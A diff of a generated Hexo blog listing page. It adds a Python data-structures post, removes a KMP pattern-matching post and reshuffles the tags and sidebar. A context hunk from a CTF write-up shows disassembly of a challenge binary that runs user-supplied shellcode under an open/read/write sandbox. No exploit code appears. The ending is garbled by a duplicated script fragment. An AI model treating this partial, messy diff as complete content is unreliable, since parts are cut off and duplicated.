+		<h2 id="一、Python知识图谱"><a href="#一、Python知识图谱" class="headerlink" title="一、Python知识图谱"></a>一、Python知识图谱</h2><p><img src="/.io//python.png"></p>
 <h2 id="二、数据结构"><a href="#二、数据结构" class="headerlink" title="二、数据结构"></a>二、数据结构</h2><h3 id="1-列表（list）和元组（tuple）"><a href="#1-列表（list）和元组（tuple）" class="headerlink" title="1.列表（list）和元组（tuple）"></a>1.列表（list）和元组（tuple）</h3><p>列表和元组，都是<strong>一个可以放置任意数据类型的有序集合</strong>。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&quot;string&quot;</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;string&#x27;</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;string&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
 
@@ -2023,7 +2339,7 @@
 	
 		<p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p>
 <p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p>
-<p><img src="orw.png"></p>
+<p><img src="/.io//orw.png"></p>
 <p>使用IDA Pro反汇编程序：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; // starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure>
 
@@ -2159,84 +2475,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/03/16/模式匹配算法/" >模式匹配算法</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-03-16  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-
-		
-        
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-
-	
-
-	</div>
-  <a type="button" href="/2020/03/16/模式匹配算法/#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="一、朴素模式匹配算法"><a href="#一、朴素模式匹配算法" class="headerlink" title="一、朴素模式匹配算法"></a>一、朴素模式匹配算法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回字串T在主串S中第pos个字符之后的位置。若不存在，则函数返回0；</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bf</span><span class="params">(string S, string T, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = pos;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> S_length = S.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">int</span> T_length = T.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; S_length &amp;&amp; j &lt; T_length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            i = i - j + <span class="number">1</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j &gt;= T_length) &#123;</span><br><span class="line">        <span class="keyword">return</span> i - T_length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="二、KMP模式匹配算法"><a href="#二、KMP模式匹配算法" class="headerlink" title="二、KMP模式匹配算法"></a>二、KMP模式匹配算法</h2><p>KMP(克努特-莫里斯-普拉特)</p>
-<p>字串各个位的j值的变化定义为一个数组next:</p>
-<p><img src="KMP.png"></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过计算返回字串T的next数组。*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(string T, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>, k=<span class="number">0</span>;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; T.<span class="built_in">length</span>()<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">-1</span> || T[i] == T[k]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">            next[i] = k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            k = next[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(string S, string T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = pos;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> next[<span class="number">255</span>];</span><br><span class="line">    <span class="built_in">get_next</span>(T, next);</span><br><span class="line">    <span class="keyword">int</span> S_len = S.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">int</span> T_len = T.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; S_len &amp;&amp; j &lt; T_len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || S[i] == T[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j &gt;= T_len)</span><br><span class="line">        <span class="keyword">return</span> i - T_len;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-	
-	</div>
-  <a type="button" href="/2020/03/16/模式匹配算法/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -2252,7 +2490,7 @@
 
         <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
  
-          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+       <a href="/page/4/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
         
 
   
@@ -2286,33 +2524,33 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
+			<li><a href="/tags/unix/">unix<span>2</span></a></li>
+		
+			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
+		
+			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
+		
+			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
+		
+			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
+		
+			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+		
+			<li><a href="/tags/windows内核/">windows内核<span>4</span></a></li>
+		
+			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
+		
 			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
 		
 			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
 		
-			<li><a href="/tags/python/">python<span>2</span></a></li>
-		
-			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
-		
-			<li><a href="/tags/unix/">unix<span>2</span></a></li>
-		
-			<li><a href="/tags/windows内核/">windows内核<span>4</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
-		
-			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
-		
-			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
-		
-			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
-		
 			<li><a href="/tags/Android/">Android<span>1</span></a></li>
 		
-			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
+			<li><a href="/tags/python/">python<span>2</span></a></li>
 		
-			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
-		
-			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -2324,6 +2562,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/09/17/Windbg用法/" ><i class="fa fa-file-o"></i>Windbg用法</a>
+      </li>
     
       <li>
         <a href="/2021/09/09/遇到hexo莫名其妙的bug/" ><i class="fa fa-file-o"></i>遇到hexo莫名其妙的bug</a>
@@ -2339,10 +2581,6 @@
     
       <li>
         <a href="/2021/08/30/守护进程/" ><i class="fa fa-file-o"></i>Unix守护进程</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/20/Android-Java类加载机制/" ><i class="fa fa-file-o"></i>Java类加载机制</a>
       </li>
     
   </ul>
@@ -2396,16 +2634,6 @@
 <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
 <script src="/fancybox/jquery.fancybox.pack.js"></script>
 <script type="text/javascript">
-(function($){
-  $('.fancybox').fancybox();
-})(jQuery);
-</script>
-
-
-
-</body>
-   </html>
-e="text/javascript">
 (function($){
   $('.fancybox').fancybox();
 })(jQuery);
